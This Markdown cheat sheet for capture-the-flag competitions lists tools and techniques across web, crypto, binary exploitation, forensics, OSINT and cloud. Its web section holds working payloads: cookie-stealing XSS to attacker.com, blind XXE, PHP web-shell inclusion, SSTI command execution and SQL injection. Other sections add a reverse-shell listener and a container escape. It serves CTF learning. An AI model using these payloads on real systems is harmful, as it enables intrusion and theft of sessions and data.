# CTF Master Cheatsheet - Enhanced Edition

A comprehensive reference guide for Capture The Flag (CTF) competitions covering various categories and attack vectors.

## Table of Contents

1. [Web Exploitation](#1-web-exploitation)
2. [Cryptography & Encryption](#2-cryptography--encryption)
3. [Reverse Engineering & Binary Analysis](#3-reverse-engineering--binary-analysis)
4. [Binary Exploitation (Pwn)](#4-binary-exploitation-pwn)
5. [Forensics](#5-forensics)
6. [Audio/Steganography](#6-audiosteganography)
7. [Archive/File Cracking](#7-archivefile-cracking)
8. [OSINT](#8-osint)
9. [Networking](#9-networking)
10. [Scripting](#10-scripting)
11. [Blockchain & Smart Contracts](#11-blockchain--smart-contracts)
12. [Hardware Hacking](#12-hardware-hacking)
13. [Malware Analysis](#13-malware-analysis)
14. [Cloud Security](#14-cloud-security)
15. [Game Hacking](#15-game-hacking)
16. [Miscellaneous](#16-miscellaneous)

---

## 1. Web Exploitation

Attacking web applications, APIs, and servers.

### Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Burp Suite | Intercept/modify HTTP traffic | `burpsuite` (GUI) |
| sqlmap | Automated SQL injection | `sqlmap -u "http://site.com?id=1" --dbs` |
| ffuf | Directory fuzzing | `ffuf -w wordlist.txt -u http://site.com/FUZZ` |
| Wappalyzer | Detect web technologies | Browser extension |
| OWASP ZAP | Web application scanner | `zaproxy` |
| Nuclei | Fast vulnerability scanner | `nuclei -u https://target.com` |
| gobuster | Directory/file brute-forcer | `gobuster dir -u http://target.com -w wordlist.txt` |
| Nikto | Web server scanner | `nikto -h http://target.com` |

### Common Attacks

#### 1. SQL Injection (SQLi)

**Union-Based:**
```sql
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables-- -
```

**Blind SQLi (Time-Based):**
```sql
' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
```

**Error-Based:**
```sql
' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))-- -
```

**NoSQL Injection (MongoDB):**
```javascript
{"$ne": null}
{"$regex": ".*"}
```

#### 2. Cross-Site Scripting (XSS)

**Stored XSS:**
```html
<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
```

**Reflected XSS:**
```html
<svg onload=alert(1)>
```

**DOM XSS:**
```html
<img src=x onerror=alert(1)>
```

**Filter Bypasses:**
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
```

#### 3. Local File Inclusion (LFI)

**Basic LFI:**
```
/etc/passwd
../../../../etc/passwd
```

**PHP Wrappers:**
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=expect://whoami
```

**Log Poisoning:**
```bash
# Poison Apache logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
# Then include the log
?page=/var/log/apache2/access.log&cmd=whoami
```

#### 4. Server-Side Request Forgery (SSRF)

**Basic SSRF:**
```
http://127.0.0.1:80/admin
http://localhost:22
file:///etc/passwd
```

**Bypass Filters:**
```
http://0.0.0.0:80
http://127.1:80
http://[::1]:80
```

#### 5. XML External Entity (XXE)

**Basic XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Blind XXE:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

#### 6. Template Injection (SSTI)

**Jinja2 (Python):**
```python
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**Twig (PHP):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

---

## 2. Cryptography & Encryption

### Classic Ciphers

| Cipher | Tool/Decryption Method |
|--------|------------------------|
| XOR | CyberChef or manual Python script |
| Atbash | `tr 'A-Za-z' 'Z-Az-a'` |
| Vigenère | `python3 -c "from pycipher import Vigenère; print(Vigenère('KEY').decrypt('CIPHERTEXT'))"` |
| Railfence | dcode.fr or custom decoder |
| Playfair | Online decoder or custom script |

### Modern Cryptography

#### RSA Attacks

| Attack Type | Tool/Command |
|-------------|--------------|
| Small e (e=3) | `rsactftool.py -n <n> -e 3 --uncipher <ciphertext>` |
| Chinese Remainder Theorem | `python3 -m sage -- crt.sage` (Multiple n and c) |
| FactorDB | factordb.com (Factorize n) |
| Wiener Attack | Small d attack when d < N^0.25 |
| Hastad's Attack | Multiple messages, same e |

#### AES/Block Ciphers

**ECB Mode Detection:**
```python
# Look for repeated blocks in ciphertext
chunks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
if len(chunks) != len(set(chunks)): print("Likely ECB mode")
```

**Padding Oracle Attack:**
```bash
padbuster http://target.com/decrypt.php "encrypted_data" 16 -cookies "auth=encrypted_data"
```

#### Hash Attacks

**Hash Length Extension:**
```bash
hashpump -s <original_hash> -d <original_data> -a <append_data> -k <key_length>
```

**Rainbow Tables:**
```bash
# MD5
echo -n "password" | md5sum
# SHA-1
echo -n "password" | sha1sum
```

### Cryptanalysis Tools

| Tool | Purpose |
|------|---------|
| Cryptii | Multi-cipher decoder (online) |
| CyberChef | Recipe-based crypto operations |
| hashcat | GPU-accelerated hash cracking |
| John the Ripper | Password cracking |
| rsactftool | RSA attack automation |

---

## 3. Reverse Engineering & Binary Analysis

### Disassembly/Decompilation

| Tool | Use Case |
|------|----------|
| Ghidra | Decompile binaries (GUI) |
| radare2 | `r2 -d ./binary` (CLI analysis) |
| IDA Pro | Advanced disassembly (Commercial) |
| Binary Ninja | Modern disassembler |
| Hopper | macOS disassembler |
| Cutter | GUI for radare2 |

### Static Analysis

**strings:**
```bash
strings -n 8 binary | grep -i "flag\|password\|key"
strings -e l binary    # Little-endian 16-bit
strings -e b binary    # Big-endian 16-bit
```

**objdump:**
```bash
objdump -d binary              # Disassemble
objdump -s -j .rodata binary   # Dump sections
```

**nm:**
```bash
nm binary                      # List symbols
nm -D binary                   # Dynamic symbols
```

### Dynamic Analysis

**gdb (With plugins):**
```bash
gdb ./binary
> break *main+0x10
> run
> info registers
> x/10x $rsp               # Examine stack
> disas main               # Disassemble function
```

**Useful GDB Extensions:**
- **pwndbg:** Enhanced debugging for exploit development
- **gef:** GDB Enhanced Features
- **peda:** Python Exploit Development Assistance

**ltrace/strace:**
```bash
ltrace ./binary         # Library calls
strace ./binary        # System calls
strace -e trace=network ./binary  # Network calls only
```

**Valgrind:**
```bash
valgrind --tool=memcheck ./binary    # Memory error detection
```

### Windows Reverse Engineering

| Tool | Purpose |
|------|---------|
| x64dbg | Windows debugger |
| Process Monitor | Monitor file/registry/process activity |
| API Monitor | Monitor API calls |
| PE-bear | PE file analyzer |
| Detect It Easy | Packer/protector detection |

---

## 4. Binary Exploitation (Pwn)

### Exploit Development Workflow

1. **Fuzzing:** Crash the binary with long inputs
2. **Offset Calculation:**
   ```bash
   pattern create 200
   pattern offset $eip
   ```
3. **Control EIP/RIP:** Overwrite return address
4. **Shellcode Execution:**
   ```python
   from pwn import *
   payload = b"A"*72 + p64(0xdeadbeef)
   ```

### Common Vulnerabilities

#### Buffer Overflow

**Basic Stack Overflow:**
```python
from pwn import *

p = process('./binary')
offset = 72
payload = b"A" * offset + p64(0x401234)  # Jump to win function
p.sendline(payload)
```

#### Format String

**Basic Format String:**
```python
# Read from stack
payload = b"%x." * 20

# Write to arbitrary address
payload = fmtstr_payload(offset, {target_addr: value})
```

#### Use After Free

**Heap Exploitation:**
```python
# Allocate chunk
malloc(0x20)
# Free chunk
free(chunk)
# Use freed chunk (vulnerability)
# Reallocate with controlled data
malloc(0x20)
```

### ROP Chains

**Find Gadgets:**
```bash
ROPgadget --binary ./binary | grep "pop rdi"
ropper --file ./binary --search "pop rdi"
```

**Leak Libc Address:**
```python
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

rop = ROP(elf)
rop.puts(puts_got)
rop.main()
```

### Modern Mitigations

| Mitigation | Bypass Technique |
|------------|------------------|
| NX/DEP | ROP/JOP chains |
| ASLR | Information leaks |
| Stack Canaries | Canary leaks/overwrites |
| PIE | Relative offsets |
| FORTIFY_SOURCE | Careful payload crafting |

---

## 5. Forensics

### File Inspection Tools

| Tool | Command/Use Case |
|------|------------------|
| exiftool | `exiftool image.jpg` (Metadata extraction) |
| binwalk | `binwalk -e file.bin` (Extract embedded files) |
| pngcheck | `pngcheck -v image.png` (PNG integrity check) |
| strings | `strings -n 8 binary \| grep "flag"` |
| xxd/hexed.it | `xxd file.bin` or hexed.it (Hex editor) |
| foremost | `foremost -i disk.img` (File carving) |
| scalpel | `scalpel -c scalpel.conf disk.img` |

### Memory/Disk Forensics

**Volatility (Memory analysis):**
```bash
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win7SP1x64 pslist
volatility -f memory.dump --profile=Win7SP1x64 cmdline
volatility -f memory.dump --profile=Win7SP1x64 filescan | grep -i flag
```

**Other Tools:**
- **Autopsy:** GUI-based disk analysis
- **photorec:** `photorec /dev/sdX` (Recover deleted files)
- **testdisk:** Partition recovery

### Network Forensics

**Wireshark/tshark:**
```bash
tshark -r capture.pcap -Y "http.request.method==POST"
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
```

**tcpdump:**
```bash
tcpdump -r capture.pcap -A | grep -i password
```

### APK Analysis Tools

| Tool | Command/Use Case |
|------|------------------|
| apktool | `apktool d app.apk` (Decompile APK) |
| dex2jar | `d2j-dex2jar.sh classes.dex` (Convert to JAR) |
| jd-gui | View decompiled Java code (GUI) |
| jadx | `jadx app.apk` (Decompile APK) |
| frida | Dynamic instrumentation |

### PCAP Analysis

**Extract Files from HTTP:**
```bash
tcpflow -r capture.pcap
```

**DNS Exfiltration Detection:**
```bash
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c
```

---

## 6. Audio/Steganography

### Audio Analysis Tools

| Tool | Command/Use Case |
|------|------------------|
| Audacity | Analyze spectrograms (View → Spectrogram) |
| Sonic Visualizer | Detect hidden tones/patterns |
| multimon-ng | Decode DTMF/Morse: `multimon-ng -a AFSK1200 audio.wav` |
| SoX | Audio manipulation: `sox input.wav output.wav spectrogram` |

### Image Steganography

**LSB Steganography:**
```bash
zsteg -a image.png
stegsolve image.png    # Java tool for image analysis
```

**JSteg (JPEG):**
```bash
jsteg reveal image.jpg
```

**OutGuess:**
```bash
outguess -r image.jpg output.txt
```

**Steghide:**
```bash
steghide extract -sf image.jpg
steghide info image.jpg
```

### Advanced Stego Techniques

**F5 Algorithm:**
```bash
f5 -e image.jpg -p password secret.txt
```

**SNOW (Whitespace Steganography):**
```bash
snow -C -p password stego.txt
```

---

## 7. Archive/File Cracking

### Password Cracking

| Tool | Command |
|------|---------|
| John the Ripper | `john --format=zip hash.txt` |
| fcrackzip | `fcrackzip -u -D -p rockyou.txt archive.zip` |
| pdfcrack | `pdfcrack -f file.pdf -w rockyou.txt` |
| hashcat | `hashcat -m 17200 hash.txt rockyou.txt` (PKZIP) |

### Hash Extraction

```bash
# ZIP
zip2john archive.zip > hash.txt

# RAR
rar2john archive.rar > hash.txt

# PDF
pdf2john document.pdf > hash.txt

# Office documents
office2john document.docx > hash.txt
```

### Zip Analysis

```bash
zipinfo -v archive.zip
zipdetails -v archive.zip
unzip -l archive.zip     # List contents
```

### Advanced Archive Techniques

**Known Plaintext Attack:**
```bash
pkcrack -C encrypted.zip -c file.txt -P plaintext.zip -p file.txt -d decrypted.zip
```

**Zip Bomb Detection:**
```bash
zipinfo archive.zip | grep "compression ratio"
```

---

## 8. OSINT

Open-source intelligence gathering.

### Search Engines & Techniques

**Google Dorks:**
```
site:target.com inurl:admin
intitle:"index of" "parent directory"
filetype:pdf "confidential"
inurl:"/phpMyAdmin/"
cache:target.com
```

**Shodan:**
```
port:22 country:US
http.title:"login"
ssl:"target.com"
```

### Social Media Intelligence

| Platform | Tools/Techniques |
|----------|------------------|
| Twitter | TweetDeck, Social-Searcher |
| LinkedIn | LinkedIn Sales Navigator |
| Facebook | Graph Search |
| Instagram | Picodash, InstaLooter |

### Domain & Network Intelligence

**Subdomain Enumeration:**
```bash
subfinder -d target.com
amass enum -d target.com
assetfinder target.com
```

**DNS Reconnaissance:**
```bash
dig target.com ANY
fierce -dns target.com
dnsrecon -d target.com -t std
```

### Image & Metadata Analysis

**Reverse Image Search:**
- Google Images
- TinEye
- Yandex Images

**Geolocation:**
```bash
exiftool photo.jpg | grep -i GPS
```

### Cryptocurrency Analysis

**Bitcoin:**
```bash
# Blockchain explorers
https://blockchain.info/
https://blockchair.com/
```

---

## 9. Networking

Port scanning and traffic analysis.

### Port Scanning

**Nmap Scans:**
```bash
nmap -sV -sC -p- -T4 target.com       # Full port scan
nmap --script vuln target.com         # Vulnerability scan
nmap -sU target.com                   # UDP scan
nmap --script smb-enum-shares target.com
```

**Masscan:**
```bash
masscan -p1-10000 --rate=1000 target.com
```

### Network Analysis

**Netcat (Swiss Army Knife):**
```bash
nc -lvnp 4444                         # Listen for reverse shell
nc target.com 80                      # Manual HTTP request
nc -u target.com 53                  # UDP connection
```

**Banner Grabbing:**
```bash
nmap -sV target.com
telnet target.com 80
```

### Wireless Security

**WiFi Tools:**
```bash
airodump-ng wlan0mon                  # Monitor wireless networks
aircrack-ng capture.cap -w wordlist.txt
```

### Protocol Analysis

**SMB Enumeration:**
```bash
smbclient -L //target.com
enum4linux target.com
```

**SMTP Enumeration:**
```bash
smtp-user-enum -M VRFY -U users.txt -t target.com
```

---

## 10. Scripting

Python/Bash one-liners for CTFs.

### Python Snippets

**XOR Decryption:**
```python
key = "SECRET"
data = bytes([data[i] ^ ord(key[i%len(key)]) for i in range(len(data))])
```

**Base64 Operations:**
```python
import base64
encoded = base64.b64encode(b"flag{example}")
decoded = base64.b64decode(encoded)
```

**Frequency Analysis:**
```python
from collections import Counter
text = "ENCRYPTED TEXT"
freq = Counter(text)
print(freq.most_common())
```

**Socket Programming:**
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('target.com', 1337))
s.send(b'payload\n')
response = s.recv(1024)
```

### Bash Automation

**Network Scanning:**
```bash
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from"; done
```

**File Processing:**
```bash
# Extract strings from multiple files
find . -type f -exec strings {} \; | grep -i flag

# Convert hex to ASCII
echo "666C6167" | xxd -r -p
```

### PowerShell (Windows)

**Basic Enumeration:**
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*flag*"}
Get-ChildItem -Path C:\ -Recurse -Name "*flag*"
```

---

## 11. Blockchain & Smart Contracts

### Ethereum Tools

| Tool | Purpose |
|------|---------|
| Remix | Online Solidity IDE |
| Mythril | Security analysis tool |
| Slither | Static analysis framework |
| Ganache | Local blockchain |

### Common Vulnerabilities

**Reentrancy:**
```solidity
// Vulnerable contract
function withdraw() public {
    uint amount = balances[msg.sender];
    msg.sender.call.value(amount)();  // External call
    balances[msg.sender] = 0;         // State change after call
}
```

**Integer Overflow:**
```solidity
// Before Solidity 0.8.0
uint256 value = 2**256 - 1;
value = value + 1;  // Overflows to 0
```

### Analysis Commands

```bash
# Mythril
myth analyze contract.sol

# Slither
slither contract.sol
```

---

## 12. Hardware Hacking

### Tools & Equipment

| Tool | Purpose |
|------|---------|
| Logic Analyzer | Analyze digital signals |
| Oscilloscope | Analyze analog signals |
| Bus Pirate | Interface with hardware buses |
| ChipWhisperer | Side-channel attacks |
| JTAGulator | JTAG interface discovery |

### Common Interfaces

**UART:**
```bash
screen /dev/ttyUSB0 115200
minicom -D /dev/ttyUSB0 -b 115200
```

**SPI:**
```bash
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware.bin
```

**I2C:**
```bash
i2cdetect -y 1  # Scan for devices
i2cdump -y 1 0x50  # Dump EEPROM
```

### Firmware Analysis

**Binwalk:**
```bash
binwalk -e firmware.bin
binwalk -M firmware.bin  # Recursive extraction
```

**Firmware Emulation:**
```bash
# QEMU
qemu-system-arm -M versatilepb -kernel firmware.bin
```

---

## 13. Malware Analysis

### Static Analysis

**Basic Information:**
```bash
file malware.exe
strings malware.exe | grep -i "http\|temp\|registry"
```

**PE Analysis:**
```bash
pefile malware.exe
peframe malware.exe
```

### Dynamic Analysis

**Sandbox Environments:**
- Cuckoo Sandbox
- Any.run
- Hybrid Analysis

**Monitoring Tools:**
```bash
# Linux
strace ./malware
ltrace ./malware

# Windows
procmon.exe
wireshark
```

### Reverse Engineering

**Unpacking:**
```bash
upx -d packed.exe  # Unpack UPX
```

**Debugging:**
```bash
# x64dbg (Windows)
# GDB (Linux)
gdb ./malware
```

---

## 14. Cloud Security

### AWS

**Reconnaissance:**
```bash
# S3 bucket enumeration
aws s3 ls s3://bucket-name --no-sign-request

# EC2 metadata
curl http://169.254.169.254/latest/meta-data/
```

**Tools:**
- ScoutSuite
- Prowler
- CloudMapper

### Google Cloud

**Reconnaissance:**
```bash
# Check for public buckets
gsutil ls gs://bucket-name
```

### Azure

**Tools:**
- AzureHound
- MicroBurst
- PowerZure

### Docker

**Container Escape:**
```bash
# Check for privileged containers
cat /proc/self/status | grep CapEff

# Mount host filesystem
docker run -v /:/host -it ubuntu chroot /host
```

---

## 15. Game Hacking

### Memory Analysis

**Cheat Engine (Windows):**
- Memory scanning
- Value modification
- Code injection

**Game Shark Codes:**
```
# Example format
XXXXXXXX YYYY
```

### Network Analysis

**Packet Capture:**
```bash
tcpdump -i any -w game_traffic.pcap
wireshark game_traffic.pcap
```

### Reverse Engineering Games

**Unity Games:**
```bash
# .NET Reflector
# dnSpy
```

**Unreal Engine:**
- UE4 Console Unlocker
- UModel

---

## 16. Miscellaneous

### File Analysis

```bash
xxd -g1 file.bin          # Hex dump
file mystery              # Detect file type
hexdump -C file.bin       # Canonical hex+ASCII
```

### Encoding/Decoding

```bash
echo "flag" | base64      # Encode to Base64
echo "666C6167" | xxd -r -p  # Hex to ASCII
echo "flag" | base32      # Base32 encoding
```

### Time-based Challenges

**Timing Attacks:**
```python
import time
start = time.time()
# Perform operation
end = time.time()
print(f"Time: {end - start}")
```

### QR Codes & Barcodes

**Tools:**
```bash
zbarimg qrcode.png        # Decode QR code
qrencode -o qr.png "text" # Generate QR code
```

### Git Forensics

```bash
git log --oneline         # Commit history
git show commit_hash      # Show specific commit
git reflog               # Reference log
```

### Useful One-liners

**Find flags:**
```bash
grep -r "flag{" .
find . -name "*.txt" -exec grep -l "flag" {} \;
```

**Convert between formats:**
```bash
# Binary to decimal
echo "ibase=2; 1010" | bc

# Decimal to hex
printf "%x\n" 255
```

### CTF Platforms & Practice

**Online Platforms:**
- PicoCTF
- OverTheWire
- HackTheBox
- TryHackMe
- VulnHub

**CTF Tools Frameworks:**
- CTFd
- pwntools
- CTF-Tools

---

## Contributing

Feel free to contribute to this cheatsheet by adding new techniques, tools, or improving existing content. Submit pull requests or open issues for suggestions.

## Disclaimer

This cheatsheet is provided for educational purposes and authorized security testing only. Use responsibly and only on systems you own or have explicit permission to test. The authors are not responsible for any misuse of this information.

## License

This cheatsheet is provided under the MIT License for educational purposes.
